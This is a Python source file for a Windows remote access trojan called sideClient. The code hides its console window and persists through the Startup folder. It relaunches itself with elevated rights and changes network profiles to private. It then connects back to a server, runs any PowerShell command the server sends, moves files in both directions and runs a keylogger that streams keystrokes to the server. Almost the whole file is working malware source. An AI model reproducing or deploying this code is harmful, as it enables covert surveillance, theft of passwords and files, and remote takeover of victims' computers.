import ctypes  
from random import randint

from socket import *
import subprocess as sub
from time import sleep
from tkinter import Tk, Entry, Label, ttk
from pynput.keyboard import *
import threading
from textsForTkV2 import Keys, KeysRegex

# // SYSTEM
# hide Console of this processing
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# change code page of encoding to support Hebrew
os.system("chcp 1255")


class SideClient(object):

    def __init__(self):
        self._NF = __file__[__file__.rfind("\\") + 1:]  # // no
        self.TypeFilesUpload = None
        self.isCancelDownload = None
        self.ifThisNotRun = 1
        xRun = os.popen("echo %USERNAME%").read().split("\n")
        self.nameAdmin = xRun[0]
        self.PATH = f"c:\\Users\\{self.nameAdmin}"
        self.IPServer = "127.0.0.1"  # // default
        self.PORT = 1337
        self.sock = None  # // this var of to send specific Target
        self.ZERO = "returncode=0"  # // return from powerShell
        self.RECV = int(100 ** 3.9)
        self.ONE = "ERROR"
        self.terminal = "powershell"
        self.pathConsole = f"{self.PATH}\\Desktop"  # // default`
        self.ipPrivate = None
        self.checkModeMSG = None
        self.dataFromServer = None
        self.liIPSend = []
        self.PathFilexNone = f"{self.PATH}\\Desktop.recordOfKeyB.txt"
        self.IfIpInstalled = f"{self.PATH}\\address.txt"
        self.reboot = f'{self.PATH}\\reboot.bat'
        self.runWithPermission = f'{self.PATH}\\per.bat'
        self.StartUp = f'{self.PATH}\\AppData\\Roaming\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup'
        xRun = open(self.IfIpInstalled, "a")  # // <^
        xRun.close()
        self.root = None
        self.En = None
        self.Bu = None
        self.UploadRate = 45000000
        self.RanNumber = randint(1, 98555)

    # write file -bat- for kill after file move to dir->startup
    def RestartMechanism(self):
        os.chdir(self.pathConsole)  # // have to  in Desktop
        result = os.popen(f"dir /s /b sideClient.exe").read().split("\n")
        if len(result) > 1 and not os.path.exists(self.reboot):
            with open(self.runWithPermission, "w") as PS:
                PS.write(f"powershell start-Process c:\\Users\\{self.nameAdmin}\\Desktop\\sideClient.exe -Verb runas")

            with open(self.reboot, 'w') as cmd:
                cmd.write(f'taskkill /im sideClient.exe /f')

            os.system(f"start {self.reboot} && timeout 1 && "
                      f"start {self.runWithPermission}")

    # // NetworkPrivate {hhhhhh (:}
    def NPMechanism(self):
        result = os.popen(f"dir /s /b sideClient.exe").read().split("\n")
        if len(result) > 1 and os.path.exists(self.reboot):
            sub.run(['powershell', 'Set-NetConnectionProfile -name "*" -NetworkCategory private'], shell=True)
            os.system(f"move {result[0]} {self.StartUp} &&"
                      f"start {self.reboot} &&"
                      f"start {self.StartUp}\\sideClient.exe")

    # save address of server in file.txt dir->c:\\Users\\<!>name<!>
    def saveAddress(self):
        self.IPServer = self.En.get()
        with open(self.IfIpInstalled, "w") as add:
            add.write(self.IPServer)
        self.root.destroy()

    # ask the address of server in graphic configuration
    def addressServer(self):
        address = open(self.IfIpInstalled, "r")
        if len(address.read()) < 7:
            self.root = Tk()
            self.root.geometry("240x100")

            self.En = Entry(self.root, width=30, fg="red")
            self.En.place(x=50, y=10)
            La = Label(self.root, text="SERVER")
            La.place(x=0, y=10)
            self.Bu = ttk.Button(text="install", command=lambda: SideClient.saveAddress(self))
            self.Bu.place(x=90, y=40)
            self.root.mainloop()

        else:
            address = open(self.IfIpInstalled, "r")
            self.IPServer = address.read()
        address.close()

    # 1. runs the function that take ipv4 from -ipconfig-
    #    to send when have connection
    #
    # 2. defined in protocol ipv4 and sock_stream for
    #    regular call of packets and defined port with
    #    the address that defined with graphic configuration
    #
    # 3. sideClient just get data and return
    #           :::all MODE (see self.checkModeMSG):::
    #
    #    "exit" to exit , "Command" to get command , send to
    #    -powerShell- and return this to server, "image"
    #    to get path just of image.jpg , "ListenKeyboard"
    #    listen to any press of the keyboard in order send
    #    this to server
    def startConnect(self):
        SideClient.sendIPv4(self)
        while True:
            try:

                self.sock = socket(AF_INET, SOCK_STREAM)
                self.sock.connect((self.IPServer, self.PORT))
                self.sock.sendall(f"{self.ipPrivate}|{self.nameAdmin}".encode())

                while True:
                    self.checkModeMSG = self.sock.recv(1200).decode()
                    self.dataFromServer = self.sock.recv(1200).decode()

                    if "EXIT" == self.checkModeMSG:
                        self.sock.sendall("close".encode())
                        sleep(1)
                        break

                    elif "Command" == self.checkModeMSG:
                        try:
                            answer = sub.run([self.terminal, self.dataFromServer], shell=True, timeout=5)

                            if self.ZERO in str(answer):
                                SideClient.sendResultCommand(self)
                            else:
                                self.sock.sendall(self.ONE.encode())
                        except sub.TimeoutExpired:
                            self.sock.sendall("this Command"
                                              " Requires a response from the shell to which the command was sent".encode())

                    elif "Download" == self.checkModeMSG:
                        answer = sub.run(f"dir /s /b \"{self.dataFromServer}\"", shell=True)
                        if self.ZERO in str(answer):
                            if os.path.isdir(self.dataFromServer):
                                print("=is folder=")
                                SideClient.UploadFolder(self)
                                print("finish upload folder")

                                # END
                                if not self.isCancelDownload == "C!NC$L":
                                    print("terminate")
                                    sleep(0.2)
                                    os.chdir(self.PATH)

                            elif os.path.isfile(self.dataFromServer):
                                SideClient.UploadFile(self)
                                print("finish  upload file")

                                # END
                                if not self.isCancelDownload == "C!NC$L":
                                    print("terminate")
                                    sleep(0.2)
                                    os.chdir(self.PATH)

                            else:
                                print('=error not f-F=')
                                self.sock.sendall(self.ONE.encode())  # have some folder like this
                        else:
                            print('=error in path=')
                            self.sock.sendall(self.ONE.encode())

                    elif "ListenKeyboard" == self.checkModeMSG:

                        if self.ifThisNotRun:
                            threading.Thread(target=SideClient.ListenKeyboard, args=(self,)).start()
                            self.ifThisNotRun -= 1

                    elif "ChDir" == self.checkModeMSG:
                        try:
                            os.chdir(self.dataFromServer)
                            status = "-successfully-"
                        except FileNotFoundError:
                            status = "NotFound~@~Path"
                        self.sock.sendall(status.encode())

                    elif "Upload" == self.checkModeMSG:
                        SideClient.DownloadData(self)

            except Exception as s:
                print(f"<START>{s}")
                sleep(3)

    # take ipv4 from -ipconfig-
    def sendIPv4(self):
        data = sub.run("ipconfig", shell=True, capture_output=True)
        List, Print = SideClient.SplitPowerShellDate(data)
        for line in List:
            if "IPv4" in line:
                IP = line[line.find(":") + 2:]
                if IP != "":
                    self.liIPSend.append(IP)
        try:
            try:
                self.ipPrivate = self.liIPSend[1]  # // LAN [!]
            except IndexError:
                self.ipPrivate = self.liIPSend[0]  # // of wifi
        except Exception:
            self.ipPrivate = "NOT SEND~"

    def FilesInDirectory(self):
        listFiles = []
        for file in os.listdir(self.dataFromServer):
            if os.path.isfile(file) and os.path.getsize(file) > 0:
                listFiles.append(file)

        return listFiles

    # in accordance with ~checkModeMSG~ this func send
    # Binary data of all Files that {path} selected from server
    def sendDataBinary(self, data):
        self.sock.sendall(data)
        self.sock.recv(1024)  # // iGet

    def UploadFolder(self):

        os.chdir(self.dataFromServer)
        files = SideClient.FilesInDirectory(self)
        self.sock.sendall(f"Folder|{len(files)}".encode())
        print(f"echo Folder|{len(files)}")
        self.isCancelDownload = self.sock.recv(1024).decode()  # // iGet
        if not self.isCancelDownload == "C!NC$L":
            for file in files:

                SizeFile = os.path.getsize(file)
                x = 0
                print(f"read22 {file}")
                f = open(file, "rb")

                self.sock.sendall(f"{file}".encode())
                self.sock.recv(1024)  # // iGet
                while True:
                    if SizeFile > x:
                        FD = f.read(self.UploadRate)
                        x += len(FD)
                        print(f"length fata ={file} == {x}")
                        SideClient.sendDataBinary(self, FD)
                    else:
                        f.close()
                        print("finish file")
                        self.sock.sendall("R1ad0n1F".encode())
                        self.sock.recv(1024)  # // iGet
                        self.UploadRate = 50000000
                        break

        else:
            print("not run >cancel")
            pass

    def UploadFile(self):
        F = self.dataFromServer
        SizeFile = os.path.getsize(F)
        data = open(F, "rb")
        x = 0
        self.sock.sendall(f"File|1|{SizeFile}".encode())
        print(f"echo = File|1|{SizeFile}")
        self.isCancelDownload = self.sock.recv(1024).decode()  # // iGet
        if not self.isCancelDownload == "C!NC$L":
            try:
                while True:
                    if SizeFile > x:
                        print(f"data length={x}")
                        FD = data.read(self.UploadRate)
                        x += len(FD)
                        SideClient.sendDataBinary(self, FD)
                    else:
                        print("finish file")
                        data.close()
                        self.sock.sendall("R1ad0n1F".encode())
                        self.sock.recv(1024)  # // iGet
                        break
            except PermissionError:
                print("PER error")
                pass
        else:
            data.close()

    def DownloadFolder(self):

        Path = self.dataFromServer

        if not os.path.isdir(Path):
            os.mkdir(Path)
        else:
            self.RanNumber = (1, 98554)
            os.mkdir(f"{Path}{self.RanNumber}")

        self.sock.sendall("GetTypeDownload".encode())
        for x in range(int(self.TypeFilesUpload[1])):

            NF = self.sock.recv(1024).decode()
            file = open(f"{Path}\\{NF}", "ab")
            self.sock.sendall("GetFileName".encode())

            while True:
                self.dataFromServer = self.sock.recv(self.UploadRate)

                if not "R1ad0n1F".encode() in self.dataFromServer:
                    print(f"length data ={len(self.dataFromServer)}")
                    file.write(self.dataFromServer)
                    self.sock.sendall("GetDataBinary".encode())

                else:
                    print("finish file")
                    file.close()
                    self.sock.sendall("GetOneFile".encode())
                    break

    def DownloadFile(self):

        Path = self.dataFromServer
        file = open(f"{Path}\\{self.TypeFilesUpload[2]}", "ab")
        self.sock.sendall("GetTypeDownload".encode())

        while True:
            self.dataFromServer = self.sock.recv(self.UploadRate)
            if not "R1ad0n1F".encode() in self.dataFromServer:
                print(f"length data ={len(self.dataFromServer)}")
                file.write(self.dataFromServer)
                self.sock.sendall("GetDataBinary".encode())

            else:
                print("finish file")
                file.close()
                self.sock.sendall('GetOneFile'.encode())
                break

    def DownloadData(self):

        slash = "\\"
        answer = sub.run(f"dir \"{self.dataFromServer[:self.dataFromServer.rfind(slash)]}\"", shell=True)
        if self.ZERO in str(answer):

            self.sock.sendall("NoError".encode())  # // if not error in answer [!]

            self.TypeFilesUpload = self.sock.recv(1024).decode().split("|")

            if "C!NC$L" not in self.TypeFilesUpload or "ERROR_HEBREW" not in self.TypeFilesUpload:
                if self.TypeFilesUpload[0] == "File":
                    print("=select file=")
                    SideClient.DownloadFile(self)
                    print("finish download file")

                    print("=terminate=")

                elif self.TypeFilesUpload[0] == "Folder":
                    print("=select file=")
                    SideClient.DownloadFolder(self)
                    print("finish download folder ")
                    print("terminate")

    # processes the command sent from the server and send this
    def sendResultCommand(self):
        dateReturn = sub.run([self.terminal, self.dataFromServer], capture_output=True)
        self.sock.sendall(dateReturn.stdout)

    # kill process ListenKeyboard to quit from this MODE
    def stopListener(self):
        if self.dataFromServer == "StopRecording":
            return False

    # 1. import Keys containing all Keys that have in keyboard
    #    so if press and this Regex the func canceled and does not send
    #    like he is, func changing or Not sending at all. if press is regex
    #    !-Not sending at all-!
    def ListenKeyboard(self):

        def Listener_To_Keyboard(key):
            global liLetter, press

            liLetter = []

            if str(key) in Keys and str(key) not in str(KeysRegex.items()):
                press = str(key)
            elif str(key) not in Keys and str(key) not in str(KeysRegex.items()):
                press = str(key)

            liLetter.append(press)
            for keyP in Keys:
                if keyP in str(liLetter):
                    valueKey = Keys.get(keyP)
                    delKey = liLetter.index(keyP)
                    liLetter.pop(delKey)
                    liLetter.insert(delKey, valueKey)

            if liLetter:
                toSend = "".join(str(liLetter)) \
                    .replace("'", "") \
                    .replace("[", "") \
                    .replace("]", "") \
                    .replace(",", "") \
                    .replace("\"", "")  # // replace: " .
                try:
                    self.sock.sendall(toSend.encode())  # // !
                except OSError:  # //
                    pass

                liLetter = []

        def Reader_Keyboard():
            file = open(self.PathFilexNone, "r")
            DateRead = file.read().replace("\\t", " ")
            Date = DateRead.split("\\n")
            for Word in Date:
                pass

        with Listener(on_press=Listener_To_Keyboard, on_release=lambda slf: SideClient.stopListener(self)) as listen:
            listen.join()

        self.sock.sendall("StopRecording".encode())
        self.ifThisNotRun = 1

    # change the regexes return
    @staticmethod
    def SplitPowerShellDate(data):
        st = str(data)
        date1 = st.replace("\\r\\n", "\n").split('\n')
        date2 = st.replace("\\r\\n", "\n")

        return date1, date2


Root = SideClient()
Root.addressServer()
Root.RestartMechanism()
Root.NPMechanism()
Root.startConnect()

# //  Project created By: Avraham sabann
# //  START: 12/1/2021
# //  END: 27/3/2021
# //  youtube: https://www.youtube.com/channel/UCmjNqTy_Qg-Ns0jT9atWr7g
# //  Git: https://github.com/albertPPower
# //  IMPORTS: tkinter; threading; ctypes; random; socket; subprocess; time; pynput;
# //  Self-library: textsForTkV2;
# //  THANKS mySelf and YOU

